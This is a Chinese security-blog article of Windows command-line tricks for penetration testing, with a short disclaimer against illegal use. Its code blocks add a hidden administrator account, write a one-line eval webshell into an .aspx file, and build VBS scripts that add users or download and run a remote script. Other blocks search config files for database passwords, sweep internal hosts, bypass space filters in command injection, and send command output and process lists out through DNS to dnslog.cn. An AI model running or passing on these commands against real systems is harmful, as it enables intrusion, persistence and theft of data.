<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jLdnQ2TjoKobN4nu9kJ8Qg)<table><tbody><tr><td width="557" valign="top" height="62"><section><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

**0x01 前言**

渗透测试中无论是打点，还是后渗透，多多少少都会用到命令行下的一些技巧以达到快速拿到目标主机权限和绕过一些安全防护功能等。其实在 cmd 和 powershell 下只要灵活运用就能满足大部分渗透需求，主要还是看你遇到什么样的场景，需要完成什么需求，达到什么样的效果？

当然，这里笔者也只是将以前自己常用到的，以及在看各位师傅文章中学到的技巧搜集整理在一起分享给大家，希望对大家能有所帮忙，有时间再做补充，也期待各位师傅的补充！！！如有错误，还望指出！！！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDjzjIQgDD4wUBR0WkSx8HQjfYK1mRJfibGBGibXwMmibpyFHukKG79IaDw/640?wx_fmt=png)

  

**0x02 利用 |/& 管道符执行多条命令**

**应用场景：**常用于查找远程桌面端口号、异常网络连接以及添加管理员用户等。  

```
netstat -ano | findstr "ESTABLISHED"
net user 90sec 123456 /ad & net localgroup administrators 90sec /ad
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDicicznECspY47EVW5QeNSfc4yRPntwOiazH0VHxF3AxQZECzqHXcQO1EQ/640?wx_fmt=png)

****0x03 利用 ^ 转义符解决 <> 字符问题****

**应用场景：**常用于写入 Webshell 木马文件时对 <>、& 等特殊字符的转义，不加写不了。  

```
echo ^<%@Page Language="Jscript" validateRequest="false"%^>^<%Response.Write(eval(Request.Item["w"],"unsafe"));%^> > c:\Users\3had0w\Desktop\ok.aspx
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDo1SptPLDD7mo4ZGfprOHNTaf9NhNyfdFIh5qsQEqS5qpzZX6qJicBPQ/640?wx_fmt=png)

**0x04 利用 dir/for 等命令查找网站路径**

**应用场景：**常用于内网信息搜集查找铭感文件和内容，也可根据文件名、扩展以及内容来查找文件所在位置绝对路径，如：1. 网站路径和数据库连接文件、2. 被黑灰产修改过的（跳转）脚本文件等。  

```
dir /a/b/s D:\web\*.asp
where /r D:\web\ *.php *.asp
for /r D:\web\ %i in (*.php *.asp) do @echo %i
%windir%\system32\inetsrv\appcmd list VDIR

findstr /n /s /i "uid=sa" E:\ftp_bak\*.config
findstr /n /s /i "DB_PWD" D:\www\*.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDzqYMnLScoliaVVYMNk2QYpz4CMLdORptricCT97icEibuHDbprpepV82Gg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDib39RkbOOmdGfHIJpaBY4kSpMicn5kaaPJAPo2Mr6zHWKzSX4Gq6ZL5g/640?wx_fmt=png)

**0x05 利用: 冒号将 VBS 脚本代码写在一行**

**应用场景：**常用于命令行下写入 Webshell 木马、VBS 添加用户、下载者等恶意脚本，> 创建，>> 叠加，注意 2、4、8、9 行中的 & 管道符，也要用 ^ 转义下才能正常写入。

```
echo set wsnetwork=CreateObject("WSCRIPT.NETWORK") > C:\adduser.vbs
echo os="WinNT://"^&wsnetwork.ComputerName >> C:\adduser.vbs
echo Set ob=GetObject(os) >> C:\adduser.vbs
echo Set oe=GetObject(os^&"/Administrators,group") >> C:\adduser.vbs
echo Set od=ob.Create("user","betasec") >> C:\adduser.vbs
echo od.SetPassword "pass!@#!23" >> C:\adduser.vbs
echo od.SetInfo >> C:\adduser.vbs
echo Set of=GetObject(os^&"/betasec",user) >> C:\adduser.vbs
echo oe.add os^&"/betasec" >> C:\adduser.vbs
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDrOJuttJ63pboRxreOEsDt5oiaJk3zlucNYOjr5JB4H1boC2PxTZOJOw/640?wx_fmt=png)

**0x06 利用 >/>> 重定向符叠加写入 VBS**

**应用场景：**常用于 MSSQL 高权限注入点写入 VBS 脚本文件，一行一行写过于繁琐。VBScript 可以在一行代码内同时对两个变量进行赋值，中间用冒号分隔即可，脚本可正常执行。

```
echo Set Post = CreateObject("Msxml2.XMLHTTP"):Set Shell = CreateObject("Wscript.Shell"):Post.Open "GET","http://127.0.0.1/adduser.txt",0 :Post.Send():Set aGet = CreateObject("ADODB.Stream"):aGet.Mode = 3:aGet.Type = 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile "c:\adduser.vbs",2:wscript.sleep 1000:Shell.Run ("c:\adduser.vbs") > c:\down.vbs
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDuoosibYdBV5SibdYgh20nibsSiavjSIalUgSQiaGQ9HLfAN22sWORhekxIQ/640?wx_fmt=png)

**0x07 利用 for 命令探测工作组 / 域存活主机**

**应用场景：**常用于探测工作组和域内存活主机，用的是 Ping 命令，基于 ICMP 协议，但如果禁 Ping 时该方法则无效，利用此方法在实际应用中可能需要做少许修改：内网 IP 或网段。

**直接在命令终端回显：**

```
@for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | findstr /i "ttl="
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDibe9Vvibia5PH4f0mBVooia3rIibBKh8fYvBibALCcNx7BwLZX7NoSF7BydA/640?wx_fmt=png)

**将存活主机写入到文件：**

```
@for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | findstr /i "ttl=" >nul & if errorlevel 1 (echo 192.168.1.%i May be sleeping ! >> result.txt) else (echo 192.168.1.%i is alive ! >> result.txt)

查看扫描后的存活主机：
type result.txt | findstr "alive"
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD17guzFGg6z4r9SZUA6a1MNyfcatOPyxRqrOuIDlBhTDG6nk8RzMzEw/640?wx_fmt=png)

**工作组 / 域内存活主机探测：**

这个批处理文件可用于对内网工作组和域内存活主机进行简单的扫描探测，并且支持中英文操作系统。

```
@echo off
@echo.
@FOR /F "usebackq delims=, " %%J IN (`net view /domain ^|find "命令成功完成" /v ^|find "The command completed successfully." /v ^|find "命令成功完成" /v ^|find "--" /v ^|find "Domain" /v ^|find "" /v ^|find "コマンドは正常に終了しました" /v /i`) do (
@echo ====== Domain:%%J =========
@FOR /F "usebackq eol=; delims=, " %%i in (`net view /domain:%%J ^|findstr "\\"`) do (
@FOR /F "usebackq eol=; tokens=1,2,3* delims=\\" %%a in (`@echo %%i`) do (
ping %%a -4 -n 1 -w 100 |find /i "ping" > %%a.txt
@FOR /F "tokens=2 delims=[]" %%b in (%%a.txt) do @echo \\%%a = [%%b]
@del /f /q %%a.txt
)))
@echo ====== Getting IP Complete ======
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDuz92w6k2Io1ibpWon5W4jTUj4icC8gSNU96Xw9s8U5aZfjzA8XAlM6Bg/640?wx_fmt=png)

**0x08 利用符号或者环境变量截取绕过空格**

**应用场景：**常用于命令执行漏洞绕过，在代码层面或安全防护中过滤了空格，也就是在执行命令时不能带有空格，最近几天在几个群里都看到有人讨论这个问题，也属常见问题。

**特殊符号：[记一次 “上传” 命令执行的绕过案例](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247491624&idx=1&sn=6ba97c2d5485fb668c074db3985bb7f9&chksm=cfa5443bf8d2cd2d4be615b26f9275b5617563013258cf7092021167c9e434320913ab30b7f0&scene=21#wechat_redirect)**

```
echo.123>>a.txt
echo,123>>a.txt
type;a.txt
[...SNIP...]

&cd;..&cd;..&cd;windows&cd;system32
&cd;..&cd;1631359215&cs.jpg&.jpg
[...SNIP...]
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD9ib59TnTzlWyRQPxSmbQia4PWEZWzlmjvUjglZ4KFc3dJgB64Qz5OLqA/640?wx_fmt=png)

**环境变量：[命令注入靶场空格过滤绕过测试](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247485655&idx=1&sn=229537b3ce9e7927178eec9882d69168&chksm=cfa6acc4f8d125d22fd063f6e80c7c6751e3c5ecea568b59f45d1a60591b4f4cd208ab6dc6a2&scene=21#wechat_redirect)**

```
%path:~10,1%
%programfiles:~10,1%
%processor_identifier:~7,1%
%commonprogramw6432:~10,1%
%commonprogramfiles(x86):~10,1%
%commonprogramfiles:~10,1%
%commonprogramfiles:~10,-18%
%commonprogramfiles:~23,1%
%fps_browser_app_profile_string:~8,1%
[...SNIP...]
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDRAjK2jJzr32sc6mw2aUAaukyBQZ6YguHTaUs98xicRCAl1mYLdNtXPQ/640?wx_fmt=png)

**0x09 利用 dnslog 查看注入点执行命令结果**

**应用场景：**常用于探测目标主机的 DNS 协议是否能够出网，或者是在高权限注入无回显时也可以通过 dnslog 来将命令执行结果带出，如：查看当前用户和进程列表等。

**探测 DNS 出网状态：**

```
ping ******.dnslog.cn
nslookup ******.dnslog.cn
<?php gethostbyname("******.dnslog.cn");?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDVL12iaNUgUOUOOrfvU04MLqOSyRViayETdpfGKRCCZ3bYDY4HEhanib5Q/640?wx_fmt=png)

**查询当前用户权限：**

```
for /F %i in ('whoami') do nslookup %i.lr5dyr.dnslog.cn

cmd /v /c "whoami > temp && certutil -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && set /p MYVAR=< temp3 && set FINAL=!MYVAR!.ly9hvm.dnslog.cn && nslookup !FINAL!" && del temp*
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGD5Nkm5yAdVOGxsbTY6FCnXdmr51AtNS9ru4tVPzEjnYNiaTPdyVeFFpQ/640?wx_fmt=png)

**0x10 利用 dnslog 查看目标主机的杀毒软件**

**应用场景：**用于 MSSQL 高权限注入，目标主机不出网，但想利用 dnslog 探测主机中是否有杀软？两种方法原理一样，都是先获取进程列表，然后 for、ForEach 循环 Ping、nslookup 通过 dnslog 带出来。

```
for /F %i in ('wmic process get Name ^| findstr ".exe"') do ping -n 1 %i.******.dnslog.cn >nul

powershell -c "Get-Process | select processname > 1.txt"
powershell -c "Get-Content .\1.txt | Sort-Object -Unique | ForEach-Object {if($_ -match $regex){$b=$_.trim();ping -n 1 $b'.***fks2j.ns.dns3.cf.'} }"
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibI30NgMPKCXnvJhcL0CGDX1vq27Fic9Wm6LKLrEQC4jicHRxDgHbK1dboUPGCqic9eZKgGavDKCIRw/640?wx_fmt=png)

关注公众号回复 “9527” 可免费获取一套 HTB 靶场文档和视频，“1120” 安全参考杂志电子版，“1208” 个人常用高效爆破字典，“0221”2020 年酒仙桥文章打包，“2191”9 月 1 日前潇湘信安所有文章打包。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png) 还在等什么？赶紧点击下方名片关注学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png)

公众号

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOec0rlHvusMpuZ14HCT4dZn9ZdY1H6uNgSDcvJmovZibZVy4FV2kEib6nJ9SASN1b4Es56KdPsHWibKg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247491360&idx=1&sn=e4c3d356b45d7fe821dc2b645f30a595&chksm=cfa6bb33f8d132259884026238db7b79f33da3f3fff2f90a87e4a447118a1be8c4e948031d8f&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)